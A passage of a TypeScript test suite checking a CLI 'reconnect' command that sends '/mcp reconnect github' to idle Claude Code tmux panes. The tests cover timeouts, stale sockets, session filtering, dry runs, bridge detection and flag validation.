		expect(reconnect(["repo"], config, a.d)).toBe(0);
		expect(a.out).toContain("repo: 1 stale tmux socket ignored (no tmux server running on it)");
		expect(a.out.some((l) => l.includes("/tmp/tmux-1000/stale"))).toBe(false);
		expect(a.out[a.out.length - 1]).toBe("sent 1, skipped 0");
		const two = [...one, { socket: "/tmp/tmux-1000/x", why: "no server process for this socket" }];
		const b = withPanes([pane("%1", IDLE)], {}, {}, "❯ \n", two);
		expect(reconnect(["repo"], config, b.d)).toBe(0);
		expect(b.out).toContain("repo: 2 stale tmux sockets ignored (no tmux server running on them)");
	});

	it("a tmux server that doesn't answer in time is skipped, and the next server carries on", () => {
		const OTHER: TmuxServer = { socket: "/home/repo/.tmux/claude", binary: "tmux" };
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })),
				tmuxPanes: vi.fn((server: TmuxServer) => {
					if (server.socket === SOCK) throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux");
					return [pane("%9", IDLE)];
				})
			},
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(`repo ${SOCK} - skipped (tmux timed out)`);
		expect(out).toContain(`repo ${OTHER.socket} %9 (main, /home/repo) github sent`);
		expect(out[out.length - 1]).toBe("sent 1, skipped 1");
	});

	it("a pane whose capture times out is skipped with the timeout reason, and the next pane is judged", () => {
		const { d, out } = withPanes([pane("%1", IDLE, { timedOut: true }), pane("%2", IDLE)]);
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (tmux timed out)`);
		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
	});

	it("a re-capture that times out skips the pane instead of judging a stale screen", () => {
		const { d, out } = withPanes([pane("%1", IDLE)], {
			tmuxPaneText: vi.fn(() => {
				throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux");
			})
		});
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (tmux timed out)`);
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("prints the pane's tmux session and working directory, control characters cleaned out of both", () => {
		const { d, out } = withPanes([pane("%1", IDLE, { session: "mai\x07n", cwd: "/tmp/\rx" })]);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 (mai?n, /tmp/?x) github sent`);
		expect(out.join("\n")).not.toContain("\x07");
		expect(out.join("\n")).not.toContain("\r");
	});

	describe("--session", () => {
		const TYPING = "❯ half a sentence";
		it("keeps only the panes whose tmux session name matches, and says nothing about the rest", () => {
			const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE, { session: "other" })]);
			expect(reconnect(["repo", "--session", "main"], config, d)).toBe(0);
			expect(d.tmuxSend).toHaveBeenCalledTimes(1);
			expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%1", "/mcp reconnect github", info);
			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
			expect(out[out.length - 1]).toBe("sent 1, skipped 0");
		});

		it("matches pane ids too, and several values are a union", () => {
			const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE, { session: "other" }), pane("%3", IDLE, { session: "third" })]);
			expect(reconnect(["repo", "--session", "%3", "--session", "main"], config, d)).toBe(0);
			expect(d.tmuxSend).toHaveBeenCalledTimes(2);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
			expect(out).toContain(`repo ${SOCK} %3 (third, /home/repo) github sent`);
			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
		});

		it("filters a dry run", () => {
			const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE, { session: "other" })]);
			expect(reconnect(["repo", "--dry-run", "--session", "main"], config, d)).toBe(0);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github would send`);
			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
			expect(out[out.length - 1]).toBe('dry run: 1 pane(s) would get "/mcp reconnect"');
		});

		it("filters what --wait watches: the background run is handed only the matching panes", () => {
			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", TYPING, { session: "other" })]);
			expect(reconnect(["repo", "--session", "main", "--wait", "1m"], config, d)).toBe(0);
			expect(d.startBackground).toHaveBeenCalledWith(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`]);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github waiting (composer not empty, or a dialog is showing)`);
			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
		});

		it("reports a --session that matched no pane, fails the run, and never says no sessions were running", () => {
			const { d, out, err } = withPanes([pane("%1", IDLE)]);
			expect(reconnect(["repo", "--session", "typo"], config, d)).toBe(1);
			expect(err).toContain("no pane matched --session typo");
			expect(d.tmuxSend).not.toHaveBeenCalled();
			expect(d.startBackground).not.toHaveBeenCalled();
			// the "no sessions running" line would be wrong here: the pane exists, it just didn't match
			expect(out.some((l: string) => l.includes("no Claude Code sessions running"))).toBe(false);
		});

		it("an agent with no panes at all still gets the no-sessions line next to the report", () => {
			const { d, out, err } = withPanes([]);
			expect(reconnect(["repo", "--session", "main"], config, d)).toBe(1);
			expect(out).toContain("repo: no Claude Code sessions running");
			expect(err).toContain("no pane matched --session main");
		});

		it("a dry run with no match fails the same way", () => {
			const { d, err } = withPanes([pane("%1", IDLE)]);
			expect(reconnect(["repo", "--dry-run", "--session", "%9"], config, d)).toBe(1);
			expect(err).toContain("no pane matched --session %9");
		});

		it("refuses a missing value, a flag as the value, and --session in the background run", () => {
			const { d } = withPanes([pane("%1", IDLE)]);
			expect(() => reconnect(["repo", "--session"], config, d)).toThrow("--session takes a tmux session name or a pane id");
			expect(() => reconnect(["repo", "--session", "--dry-run"], config, d)).toThrow("--session takes a tmux session name or a pane id");
			expect(() => reconnect(["repo", "--session", ""], config, d)).toThrow("--session takes a tmux session name or a pane id");
			expect(() => reconnect(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`, "--session", "main"], config, d)).toThrow(
				"--session is not for the background --wait run"
			);
		});
	});

	// The broker-child verdict (#251): a session whose process tree already runs the connect bridge
	// recovers from a broker restart on its own, so it is listed but not typed into, and it is not
	// a skip — it doesn't fail the run and upgrade's skip notice doesn't fire for it. --all sends
	// to it anyway.
	describe("the connect bridge verdict", () => {
		const onBridge = (id: string, over: Partial<Pane> = {}): Pane => pane(id, IDLE, { brokerChild: "bridge", ...over });

		it("leaves a session already on the connect bridge alone — listed as nothing to do, not a skip: the run exits 0", () => {
			const { d, out } = withPanes([onBridge("%1")]);
			expect(reconnect(["repo"], config, d)).toBe(0);
			expect(d.tmuxSend).not.toHaveBeenCalled();
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - on the connect bridge (nothing to do)`);
			expect(out[out.length - 1]).toBe("sent 0, skipped 0 (1 already on the bridge)");
		});

		it("sends to a session on the old socat entry, and to one with no broker child at all", () => {
			const { d, out } = withPanes([pane("%1", IDLE, { brokerChild: "socat" }), pane("%2", IDLE)]);
			expect(reconnect(["repo"], config, d)).toBe(0);
			expect(d.tmuxSend).toHaveBeenCalledTimes(2);
			expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%1", "/mcp reconnect github", info);
			expect(out[out.length - 1]).toBe("sent 2, skipped 0");
		});

		it("a bridge pane and a real skip together: the real skip fails the run, the bridge one doesn't", () => {
			const { d, out } = withPanes([onBridge("%1"), pane("%2", "❯ half typed")]);
			expect(reconnect(["repo"], config, d)).toBe(3);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - on the connect bridge (nothing to do)`);
			expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github skipped (composer not empty, or a dialog is showing)`);
			expect(out[out.length - 1]).toBe("sent 0, skipped 1 (1 already on the bridge)");
		});

		it("--all sends to a bridge pane too, and the summary doesn't count it", () => {
			const { d, out } = withPanes([onBridge("%1"), pane("%2", IDLE)]);
			expect(reconnect(["repo", "--all"], config, d)).toBe(0);
			expect(d.tmuxSend).toHaveBeenCalledTimes(2);
			expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%1", "/mcp reconnect github", info);
			expect(out[out.length - 1]).toBe("sent 2, skipped 0");
		});

		it("a bridge pane never goes to --wait: it isn't blocked, there is nothing to wait for", () => {
			const { d, out } = withPanes([onBridge("%1", { text: "❯ half typed" })]);
			expect(reconnect(["repo", "--wait", "1m"], config, d)).toBe(0);
			expect(d.startBackground).not.toHaveBeenCalled();
			expect(d.sleep).not.toHaveBeenCalled();
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - on the connect bridge (nothing to do)`);
		});

		it("a dry run lists bridge panes as skipped too, counts them in its summary, and still exits 0", () => {
			const { d, out } = withPanes([onBridge("%1")]);
			expect(reconnect(["repo", "--dry-run"], config, d)).toBe(0);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - on the connect bridge (nothing to do)`);
			expect(out[out.length - 1]).toBe('dry run: 0 pane(s) would get "/mcp reconnect" (1 already on the bridge)');
		});

		it("the bridge verdict comes before the key checks: a bridge pane needs nothing, even with no broker entry", () => {
			const noEntry = JSON.stringify({ mcpServers: { x: { command: "npx" } } });
			const { d, out } = withPanes([onBridge("%1")], {}, { [claude("repo")]: noEntry });
			expect(reconnect(["repo"], config, d)).toBe(0);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - on the connect bridge (nothing to do)`);
			expect(out.some((l: string) => l.includes("no broker MCP entry"))).toBe(false);
		});

		it("refuses --all in the background run, and --all=x like the other valueless flags", () => {
			const { d } = withPanes([pane("%1", IDLE)]);
			expect(() => reconnect(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`, "--all"], config, d)).toThrow(
				"--all is not for the background --wait run"
			);
			expect(() => reconnect(["repo", "--all=x"], config, d)).toThrow("unknown flag: --all=x");
		});
	});

	it("reports a registered agent with no user account and exits 1", () => {
		const groups = [...GROUPS, { name: "gh-broker-agent-ghost", gid: 992, members: ["gh-broker", "ghost"] }];
		const { d, err } = makeDeps({ groups: () => groups });
		expect(reconnect([], config, d)).toBe(1);
		expect(err).toEqual(["ghost: no such user"]);
	});

	it("refuses an unregistered or invalid user, two users, and unknown flags", () => {
		const { d } = withPanes([]);
		expect(() => reconnect(["nobody"], config, d)).toThrow(/"nobody" is not a registered agent/);
		expect(() => reconnect(["Bad Name"], config, d)).toThrow(/not a valid agent user name/);
		expect(() => reconnect(["repo", "glmtest"], config, d)).toThrow(/name at most one agent user/);
		expect(() => reconnect(["repo", "--json"], config, d)).toThrow("unknown flag: --json");
		expect(d.tmuxSockets).not.toHaveBeenCalled();
	});

	it("prints its help and runs nothing", () => {
		const { d, out } = withPanes([]);
		expect(reconnect(["--help"], config, d)).toBe(0);
		expect(out).toEqual([RECONNECT_HELP]);
	});
});
